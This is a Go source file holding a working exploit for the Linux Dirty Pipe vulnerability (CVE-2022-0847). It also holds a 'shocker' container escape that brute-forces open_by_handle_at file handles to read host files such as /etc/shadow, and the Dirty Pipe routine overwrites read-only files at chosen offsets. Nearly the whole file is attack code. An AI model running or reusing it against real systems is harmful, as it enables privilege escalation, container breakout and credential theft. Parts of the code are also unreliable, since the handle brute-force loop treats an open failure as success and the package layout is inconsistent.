package CVE_2022_0847

import (
	"encoding/binary"
	"errors"
	"fmt"
	"golang.org/x/sys/unix"
	"io"
	"log"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

const PageSize = 4096

func initPipe() (*os.File, error) {
	r, w, err := os.Pipe()
	if err != nil {
		return nil, fmt.Errorf("pipe error: %w", err)
	}

	pipeSize, err := unix.FcntlInt(w.Fd(), syscall.F_GETPIPE_SZ, -1)
	if err != nil {
		return nil, fmt.Errorf("fcntl error: %w", err)
	}

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	buffer := [PageSize]byte{}
	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = w.Write(buffer[:]); err != nil {
			return nil, fmt.Errorf("pipe write error: %w", err)
		}
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for i := 0; i < pipeSize/PageSize; i++ {
		if _, err = r.Read(buffer[:]); err != nil {
			return nil, fmt.Errorf("pipe read error: %w", err)
		}
	}

	return w, nil
	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}

/**
 * 关键函数，用于爆破寻找指定文件的 file_handle 结构体
 * param bfd：文件描述符
 * param handlePath：爆破目标
 * param path：爆破起始路径（本 case 中为 '/' 路径）的 file_handle 结构体
 * param ih：返回句柄，用于返回 '/etc/shadow' 的 file_handle 结构体
 */

func findHandle(bfd int, handlePath string, path string, ih *unix.FileHandle) (*unix.FileHandle, error) {
	// 打开文件
	fd, err := unix.OpenByHandleAt(bfd, *ih, syscall.O_RDONLY)
	if err != nil {
		return nil, fmt.Errorf("failed to open file: %v", err)
	}
	defer syscall.Close(fd)

	// 获取文件所在目录
	buf := make([]byte, 8192)
	n, err := syscall.Getdents(fd, buf)
	if err != nil {
		return nil, err
	}

	subBuf := buf[0:n]
	for len(subBuf) > 0 {
		dirent := (*syscall.Dirent)(unsafe.Pointer(&subBuf[0]))
		subBuf = subBuf[dirent.Reclen:]
		if dirent.Ino == 0 { // 目录下无文件
			continue
		}

		bytes := (*[8192]byte)(unsafe.Pointer(&dirent.Name[0]))
		minLen := uintptr(dirent.Reclen) - unsafe.Offsetof(dirent.Name)

		if minLen > 8 {
			minLen -= 8
		} else {
			minLen = 0
		}

		// 文件名
		name := string(bytes[0 : minLen+uintptr(clen(bytes[minLen:]))])
		if name == "." || name == ".." { // 跳过无用的.
			continue
		}

		// 文件路径
		name = filepath.Join(handlePath, name)
		// 找到文件，开始爆破
		if strings.HasPrefix(path, name) {
			handle, ok := bruteforceHandle(bfd, dirent.Ino)
			if !ok {
				return nil, errors.New("failed to brute force file handle")
			}
			if dirent.Type&syscall.DT_DIR != 0 {
				// 递归查找 path 的 file_handle 结构体
				return findHandle(bfd, name, path, &handle)
			} else if name == path {
				return &handle, nil
			}
		}
	}
	return nil, nil
}

func bruteforceHandle(bfd int, ino uint64) (unix.FileHandle, bool) {
	// 转换ino成bytes类型，即[8]uint8
	bytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(bytes, ino)
	var (
		i      uint32
		handle unix.FileHandle
		flag   bool
	)

	// 由于已经拿到inode，故可以暴力破解出file_handle 结构体
	for i = 0; i < 0xffffffff; i++ {
		binary.LittleEndian.PutUint32(bytes[4:], i)
		handle = unix.NewFileHandle(1, bytes[:])
		if fd, err := unix.OpenByHandleAt(bfd, handle, syscall.O_RDONLY); err != nil {
			flag = true
			syscall.Close(fd)
			break
		}
	}
	return handle, flag
}

func clen(n []byte) int {
	for i := 0; i < len(n); i++ {
		if n[i] == 0 {
			return i
		}
	}
	return len(n)
}

func initArgs() (*os.File, int64, string, error) {
	if len(os.Args) != 4 {
		log.Fatalf("Usage: %s TARGETFILE OFFSET DATA", os.Args[0])
	}

	filePath := os.Args[1]
	f, err := os.Open(filePath)
	if err != nil {
		return nil, 0, "", fmt.Errorf("open failed: %w", err)
	}

	offset, err := strconv.ParseInt(os.Args[2], 10, 64)
	if err != nil {
		return nil, 0, "", fmt.Errorf("parse int failed: %w", err)
	}

	if offset%PageSize == 0 {
		return nil, 0, "", errors.New("sorry, cannot start writing at a page boundary")
	}

	data := os.Args[3]
	nextPage := (offset | (PageSize - 1)) + 1
	endOffset := offset + int64(len(data))

	if endOffset > nextPage {
		return nil, 0, "", errors.New("sorry, cannot write across a page boundary")
	}

	fi, err := f.Stat()
	if err != nil {
		return nil, 0, "", fmt.Errorf("stat failed: %w", err)
	}

	if offset > fi.Size() {
		return nil, 0, "", errors.New("offset is not inside the file")
	}

	if endOffset > fi.Size() {
		return nil, 0, "", errors.New("sorry, cannot enlarge the file")
	}

	return f, offset, data, nil
}

func exploit(f, w *os.File, offset int64, data string) error {
	offset--
	n, err := syscall.Splice(int(f.Fd()), &offset, int(w.Fd()), nil, 1, 0)
	if err != nil {
		return fmt.Errorf("splice failed: %w", err)
	}
	if n == 0 {
		return errors.New("short splice")
	}

	nbytes, err := w.Write([]byte(data))
	if err != nil {
		return fmt.Errorf("write failed: %w", err)
	}

	if nbytes < len(data) {
		return errors.New("short write")
	}

	return nil
}

// shocker
func shocker(target string, filename string) error {
	if filename == "" {
		filename = "/etc/hosts"
	}
	// get a FS reference from something mounted in from outside
	fd1, err := unix.Open(filename, syscall.O_RDONLY, 0)
	log.Print("mount_id:", fd1)
	log.Printf("Got mount_id by open %s", filename)
	if err != nil {
		return fmt.Errorf("failed to open %s: %v", filename, err)
	}

	// `/` 的 inode 一般为 2
	rootHandle, ok := bruteforceHandle(fd1, 0x02)
	if !ok {
		return errors.New("failed to brute force handle")
	}

	handlePath := "/"
	oh, err := findHandle(fd1, handlePath, target, &rootHandle)
	if err != nil {
		return err
	}
	if oh == nil {
		return errors.New("target file not found")
	}
	log.Println("handle", *oh, "Got target file handle!")

	targetFd, err := unix.OpenByHandleAt(fd1, *oh, syscall.O_RDONLY)
	if err != nil {
		return fmt.Errorf("open target file: %v", err)
	}
	file := os.NewFile(uintptr(targetFd), target)
	defer file.Close()
	data, err := io.ReadAll(file)
	if err != nil {
		return err
	}

	log.Printf("Successfully dump %s:\n", target)
	fmt.Println(string(data))
	return nil
}

func main() {
	targetFile := os.Args[1]
	shocker(targetFile, "/etc/hosts")
	f, offset, data, err := initArgs()
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	w, err := initPipe()
	if err != nil {
		log.Fatal(err)
	}
	defer w.Close()

	if err = exploit(f, w, offset, data); err != nil {
		log.Fatal(err)
	}

	fmt.Printf("Overwrite %s successfully.\n", targetFile)
}
